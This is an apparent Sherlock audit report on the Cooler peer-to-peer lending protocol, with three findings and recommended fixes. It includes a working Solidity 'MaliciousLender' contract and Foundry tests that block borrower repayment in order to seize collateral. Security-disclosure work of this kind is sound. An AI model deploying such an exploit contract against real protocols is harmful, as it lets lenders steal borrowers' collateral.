![](https://audits.sherlock.xyz/_next/image?url=https%3A%2F%2Fsherlock-files.ams3.digitaloceanspaces.com%2Fcontests%2Fcooler.jpg&w=96&q=75)

# [Cooler Update](https://audits.sherlock.xyz/contests/107)

| Protocol | Website | Twitter | Contest Pot | nSLOC | Length | Start | End |
|:--:|:--:|:--:|:--:|:--:|:--:|:--:|:--:|
| Cooler | [Website](https://www.olympusdao.finance/) | [Twitter](https://twitter.com/OlympusDAO) | 11,500 USDC | 512 | 3 days | August 25, 2023 | August 28, 2023 |

## What is Cooler?

Cooler is a peer-to-peer lending protocol allowing a borrower and lender to engage in fixed-duration, fixed-interest lending. Cooler Loans are lightweight, trustless, independent of price-based liquidation.

## Audit scope


- [Clearinghouse.sol](https://github.com/ohmzeus/Cooler/blob/c6f2bbe1b51cdf3bb4d078875170177a1b8ba2a3/src/Clearinghouse.sol)
- [Cooler.sol](https://github.com/ohmzeus/Cooler/blob/c6f2bbe1b51cdf3bb4d078875170177a1b8ba2a3/src/Cooler.sol)
- [CoolerCallback.sol](https://github.com/ohmzeus/Cooler/blob/c6f2bbe1b51cdf3bb4d078875170177a1b8ba2a3/src/CoolerCallback.sol)
- [CoolerFactory.sol](https://github.com/ohmzeus/Cooler/blob/c6f2bbe1b51cdf3bb4d078875170177a1b8ba2a3/src/CoolerFactory.sol)
  
## Issues found by Mlome

| Severity | Title | Count |
|:--|:--|:--:|
| High | Lender can block repayment by reverting on `onRepay()` callback` | [H-01] |
| High | Loan will be frozen after ownership transfer if new lender does not support callbacks | [H-01 bis] |
| Medium | `Clearinghouse` is still operationnal after `emergencyShutdown()` | [M-01] |

# [H-01] Lender can block repayment by reverting on `onRepay()` callback

## Summary
The procotols implements a way to callback the lender at each important function call. There is such a callback in the `repayLoan()` function which allows the borrower to repay the loan.
If the lender implements the callbacks functionnality but reverts on `onRepay()` callback, this prevents the borrower from repaying the loan. The lender can then wait until the loan expires to claim the defaulted loan's collateral.

## Vulnerability Detail
In the `repayLoan()` function, this external call is made to the lender:
```solidity
File: Cooler.sol

L184: // If necessary, trigger lender callback.
        if (loan.callback) CoolerCallback(loan.lender).onRepay(loanID_, repaid_); // @audit lender can revert this call
        return decollateralized;
```
https://github.com/ohmzeus/Cooler/blob/c6f2bbe1b51cdf3bb4d078875170177a1b8ba2a3/src/Cooler.sol#L184

If the `onRepay()` function of the lender reverts, this permanently blocks the borrower from repaying his debt.
The lender can then wait until the loan defaults to "steal" the collateral.

## Impact
### Proof of Concept
Here is a malicious contract that can perform this attack:
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.0;

import {CoolerCallback} from "src/CoolerCallback.sol";
import {Cooler} from "src/Cooler.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

contract MaliciousLender is CoolerCallback {
    address owner;
    constructor(address coolerFactory_) CoolerCallback(coolerFactory_) {
        owner = msg.sender;
    }
    
    // Revert on repay. This block borrower from repaying the loan
    function _onRepay(uint256, uint256) internal override {
        revert("Hahah you cannot repay");
    }

    function clearRequest(address cooler, uint256 reqID_) external returns (uint256 loanID){
        require(msg.sender == owner, "Only owner");
        ERC20 debt = Cooler(cooler).debt();
        uint256 amount = Cooler(cooler).getRequest(reqID_).amount;
        debt.transferFrom(msg.sender, address(this), amount);
        debt.approve(cooler, amount);
        loanID = Cooler(cooler).clearRequest(reqID_, true, true);
    }

    function claimDefaulted(address cooler, uint256 loanID_) external {
        Cooler(cooler).claimDefaulted(loanID_);
        withdraw(address(Cooler(cooler).collateral()));
    }

    function withdraw(address token) public {
        require(msg.sender == owner, "Only owner");
        ERC20(token).transfer(msg.sender, ERC20(token).balanceOf(address(this)));
    }

    function _onRoll(uint256, uint256, uint256) internal override {/* Do nothing */}
    function _onDefault(uint256, uint256, uint256) internal override {/* Do nothing */}
}
```
You can add this test to `Cooler.t.sol` to showcase the attack process.
```solidity
function test_EXPLOIT_Lender_blocks_repaiment() public {
    // test inputs
    uint256 reqAmount_ = 1000e18;
    uint256 repayAmount_ = reqAmount_/2;
    // test setup
    cooler = _initCooler();
    (uint256 reqID, ) = _requestLoan(reqAmount_);
    uint256 initCoolerCollat = collateral.balanceOf(address(cooler));
    assertEq(collateral.balanceOf(address(lender)), 0); // Lender starts with 0 collateral tokens
    console2.log("collateral: cooler balance = ",collateral.balanceOf(address(cooler)));
    console2.log("collateral: lender balance = ",collateral.balanceOf(address(lender)));

    // Lender creates MaliciousLender contract and clear the loan request
    vm.startPrank(lender);
    MaliciousLender maliciousLender = new MaliciousLender(address(coolerFactory));
    debt.approve(address(maliciousLender), reqAmount_);
    uint256 loanID = maliciousLender.clearRequest(address(cooler), reqID);
    vm.stopPrank();

    // block.timestamp < loan expiry
    vm.warp(block.timestamp + 15 days);
    console2.log("15 days passed...");

    vm.startPrank(owner);
    // Aprove debt so that it can be transferred by cooler
    debt.approve(address(cooler), repayAmount_);
    // Owner can't repay the loan because transactionis reverted by maliciousLender
    vm.expectRevert("Hahah you cannot repay");
    cooler.repayLoan(loanID, repayAmount_);
    vm.stopPrank();
    console2.log("[-] Owner was not able to repay his loan");

    // block.timestamp > loan expiry
    vm.warp(block.timestamp + DURATION + 1);
    console2.log("Few days passed, loan is now exipred...");

    // Lender claims the defaulted loan
    vm.startPrank(lender);
    debt.approve(address(maliciousLender), reqAmount_);
    maliciousLender.claimDefaulted(address(cooler), loanID);
    vm.stopPrank();
    console2.log("[+] Lender claimed faulted loan");

    assertEq(collateral.balanceOf(address(lender)), initCoolerCollat); // Lender got all the collateral tokens
    assertEq(collateral.balanceOf(address(cooler)), 0); // Lender got all the collateral tokens
    console2.log("collateral: cooler balance = ",collateral.balanceOf(address(cooler)));
    console2.log("collateral: lender balance = ",collateral.balanceOf(address(lender)));
}
```

## Code Snippet
https://github.com/sherlock-audit/2023-08-cooler-MiniGlome/blob/e8cbb79c0c30f925a94f2b6f763cd64a1104df19/Cooler/src/Cooler.sol#L185

## Tool used

Manual Review + Foundry

## Recommendation
One way to prevent this issue is by adding a try/catch statement around the callback statements (apply this to `onRoll()` too).

# [H-01 bis] Loan will be frozen after ownership transfer if new lender does not support callbacks

## Summary
The `Cooler` contracts allows the lender to transfer ownership of the loan to someone else. The problem is if the original lender supports callbacks but the new lender does not, then all callbacks will revert causing the loan to be frozen (no repayment, no roll, no claim).

## Vulnerability Detail
When a loan is created by a lender in `clearRequest`, the lender can set the value of `isCallback_` to `true` to indicate that it does support callbacks.

```solidity
File: Cooler.sol

L233: function clearRequest(
        uint256 reqID_,
        bool repayDirect_,
        bool isCallback_
    ) external returns (uint256 loanID) {
        Request memory req = requests[reqID_];

        // If necessary, ensure lender implements the CoolerCallback abstract.
        if (isCallback_ && !CoolerCallback(msg.sender).isCoolerCallback()) revert NotCoolerCallback(); // @audit check that original lender supports callbacks

L254:  loans.push(
            Loan({
                request: req,
                amount: req.amount + interest,
                unclaimed: 0,
                collateral: collat,
                expiry: expiration,
                lender: msg.sender,
                repayDirect: repayDirect_,
                callback: isCallback_ // @audit isCallback_ is stored in the loan struct
            })
        );
```

However, when the original lender transfers the ownership of the loan to a new lender, there is no check that the new lender supports callbacks the same way as the original lender does.

```solidity
File: Cooler.sol

L347: function transferOwnership(uint256 loanID_) external {
        if (msg.sender != approvals[loanID_]) revert OnlyApproved();

        // Update the load lender.
        loans[loanID_].lender = msg.sender;
        // Clear transfer approvals.
        approvals[loanID_] = address(0);
    }
```
https://github.com/ohmzeus/Cooler/blob/c6f2bbe1b51cdf3bb4d078875170177a1b8ba2a3/src/Cooler.sol#L347-L354

This will freeze the loan and make it unusable because all the calls to `repayLoan()`, `rollLoan()` and `claimDefaulted()` will revert due to callbacks no being implemented by the lender.

 ```solidity
File: Cooler.sol

// Callback in repayLoan will revert making the repayLoan function unusable.
L185: if (loan.callback) CoolerCallback(loan.lender).onRepay(loanID_, repaid_);

// Callback in rollLoan will revert making the rollLoan function unusable.
L216: if (loan.callback) CoolerCallback(loan.lender).onRoll(loanID_, newDebt, newCollateral);

// Callback in claimDefaulted will revert making the claimDefaulted function unusable.
L331: if (loan.callback) CoolerCallback(loan.lender).onDefault(loanID_, loan.amount, loan.collateral);
```

## Impact
Loan will be frozen after an ownership transfer if the original lender allowing callbacks maliciously or unintentionally transfers the ownership to an address not implementing callbacks.

## Code Snippet

https://github.com/ohmzeus/Cooler/blob/c6f2bbe1b51cdf3bb4d078875170177a1b8ba2a3/src/Cooler.sol#L347-L354
https://github.com/ohmzeus/Cooler/blob/c6f2bbe1b51cdf3bb4d078875170177a1b8ba2a3/src/Cooler.sol#L185
https://github.com/ohmzeus/Cooler/blob/c6f2bbe1b51cdf3bb4d078875170177a1b8ba2a3/src/Cooler.sol#L216
https://github.com/ohmzeus/Cooler/blob/c6f2bbe1b51cdf3bb4d078875170177a1b8ba2a3/src/Cooler.sol#L331

## Tool used

Manual Review

## Recommendation
Add this check to `transferOwnership()` function:
```diff
function transferOwnership(uint256 loanID_) external {
        if (msg.sender != approvals[loanID_]) revert OnlyApproved();
+       if (loans[loanID_].callback && !CoolerCallback(msg.sender).isCoolerCallback()) revert NotCoolerCallback();

        // Update the load lender.
        loans[loanID_].lender = msg.sender;
        // Clear transfer approvals.
        approvals[loanID_] = address(0);
    }
```

# [M-01] `Clearinghouse` is still operationnal after `emergencyShutdown()`

## Summary
Users can still get loans and roll loans from the `Clearinghouse` even after it is deactivated by the `emergencyShutdown()` function

## Vulnerability Detail
The `Clearinghouse` is used by the protocol the fullfil loan requests of DAI against gOHM, funded by the treasury. That contract can be deactivated in case of emergency if an authorized address calls the `emergencyShutdown()` function.

```solidity
File Clearinghouse.sol

L360: function emergencyShutdown() external onlyRole("emergency_shutdown") {
        active = false;

        // If necessary, defund sDAI.
        uint256 sdaiBalance = sdai.balanceOf(address(this));
        if (sdaiBalance != 0) defund(sdai, sdaiBalance);

        // If necessary, defund DAI.
        uint256 daiBalance = dai.balanceOf(address(this));
        if (daiBalance != 0) defund(dai, daiBalance);

        emit Deactivated();
    }
```
https://github.com/ohmzeus/Cooler/blob/c6f2bbe1b51cdf3bb4d078875170177a1b8ba2a3/src/Clearinghouse.sol#L360C4-L360C5

This function sets the state variable `active` to `false` and withdraws the funds available in the contract.
However, the `active` variable is not checked when taking (`lendToCooler()`) or rolling (`rollLoan()`) a loan. This implies that if the `Clearinghouse` contract has been refilled by loan repaiment the `lendToCooler()` and `rollLoan()` are still active and people can still get loans out of the `Clearinghouse`.

## Impact
The `emergencyShutdown()` function does not deactivate the contract. User can still get loans when the contract is supposed to be deactivated.

### Proof of Concept
Here is a test that can be added to `Clearinghouse.t.sol` to showcase the issue:

```solidity
function test_lending_still_active_after_emergencyShutdown() public {
    // The rebalance() function is called, either because someone called lendToCooler()
    // or someone called rebalance() directly.
    clearinghouse.rebalance();

    // The clearinghouse is deactivated by calling emergencyShutdown()
    vm.prank(overseer);
    clearinghouse.emergencyShutdown();
    console.log("[+] clearinghouse has been shut down");
    
    // Borrowers are still able to repay their loans.
    // It might even happen more than usual because of people's panic

    // Simulate loan repayments, like in test "test_rebalance_deactivated_returnFunds"
    uint256 oneMillion = 1e24; // Random value, could be anything
    deal(address(sdai), address(clearinghouse), oneMillion);
    console.log("[+] clearinghouse received tokens from repayments");

    // Try to get a loan
    uint256 loanAmount_ = oneMillion; 
    (Cooler cooler, uint256 gohmNeeded, uint256 loanID) = _createLoanForUser(loanAmount_);
    console.log("[+] clearinghouse created a loan for user");

    // Loan has been taken succesfully
    assertEq(gohm.balanceOf(address(cooler)), gohmNeeded);
    assertEq(dai.balanceOf(address(user)), loanAmount_);
    assertEq(dai.balanceOf(address(cooler)), 0);

    // Move forward 1 day
    _skip(1 days);
    
    // Ensure user has enough collateral to roll the loan
    uint256 gohmExtra = cooler.newCollateralFor(loanID);
    _fundUser(gohmExtra);
    // Try to roll loan
    vm.prank(user);
    clearinghouse.rollLoan(cooler, loanID);
    console.log("[+] clearinghouse rolled a loan for user");

    assertEq(gohm.balanceOf(address(cooler)), gohmNeeded + gohmExtra);
}
```

## Code Snippet
https://github.com/ohmzeus/Cooler/blob/c6f2bbe1b51cdf3bb4d078875170177a1b8ba2a3/src/Clearinghouse.sol#L360-L372

## Tool used

Manual Review + Foundry

## Recommendation
Check the `active` status in `lendToCooler()` and `rollLoan()`.
```solidity
if (!active) revert NotActive();
```

